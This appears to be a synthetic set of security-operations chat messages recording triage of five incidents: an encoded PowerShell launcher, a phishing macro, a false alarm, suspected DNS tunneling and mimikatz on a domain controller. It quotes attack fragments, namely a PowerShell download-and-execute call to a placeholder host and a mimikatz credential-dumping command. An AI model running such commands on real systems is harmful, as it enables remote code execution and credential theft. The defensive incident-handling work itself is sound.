messages.text: P1: Encoded PowerShell launcher fired on finance03 (jsmith). Routing to SOC.
On it. Pulling process tree from CrowdStrike.
powershell.exe -enc <base64> spawned by explorer. Decoded payload pulls from hxxp://malicious.example.invalid/payload.
I'm taking IC. Alice keep gathering. Carlos contain finance03.
finance03 isolated from network via CrowdStrike. User jsmith disabled in AD.
No lateral movement seen. Indicator: hxxp://malicious.example.invalid/payload, payload sha256 9f1c...
Containment confirmed. Action items: forensic image, password reset for jsmith, block indicator at egress, write up RCA. I'll draft the comms.
User mchen reported suspicious email with .docm attachment. Forwarded to security@.
Detonating in sandbox. Document is heavily macro-armed.
Sandbox: macro spawns powershell.exe with IEX (New-Object Net.WebClient).DownloadString to payload.example.invalid.
IC. Diana keep on payload analysis. Frank check who else got the email.
Same sender hit 14 mailboxes in HR and Finance. Pulled all copies via M365 PurgeAll.
None of the 14 users opened the attachment. Confirmed via endpoint telemetry. mchen reported it before opening.
No execution observed. Status: contained. Action items: block sender domain, add IOC to threat intel, recognize mchen for the report, write RCA.
Alert: New service install at 03:14 on finance-db-01 by svc_backup. Sentinel rule SVC-NEW-NIGHT.
Looking. svc_backup is the documented backup account.
Service is `BackupAgent`, scheduled patch from vendor. Confirmed in change ticket CHG-4421.
Closing as false_alarm. Sentinel rule needs tuning to ignore svc_backup + change-ticket window.
Anomalous DNS volume from 198.51.100.42 (web-tier). 4400 queries/min to nameserver.weirddomain.invalid.
Investigating. Could be tunneling or could be misconfigured app.
web-tier 198.51.100.42 is the marketing API. Recently deployed analytics SDK. Could explain the volume.
PCAP shows TXT record queries with base64-looking payloads. Not normal SDK behavior.
IC taking it. Helena keep PCAP analysis. Isaac get the SDK source. Status: investigating.
Still ambiguous. Need SDK source review and traffic comparison vs other instances of the marketing API to determine if this is malicious tunneling or legitimate quirk.
CRITICAL: mimikatz.exe sekurlsa::logonpasswords on dc01 (administrator account).
On it. dc01 is a domain controller — this is high priority.
IC. Karl keep gathering. Mike isolate dc01. Nadia pull all admin auth logs from the last 24h.
dc01 isolated. Promoted dc02 as primary.
Process tree: explorer.exe -> cmd.exe -> mimikatz.exe. Source: scheduled task created same day named WindowsUpdateChecker.
administrator account had a successful logon from 198.51.100.250 at 11:32:00, 30 seconds before mimikatz. That IP is not on our allowlist.

Containment status: dc01 isolated, administrator credentials reset, all admin sessions invalidated. Action items: forensic image dc01, audit krbtgt, threat hunt for the malicious scheduled task on other DCs, write RCA, brief leadership.
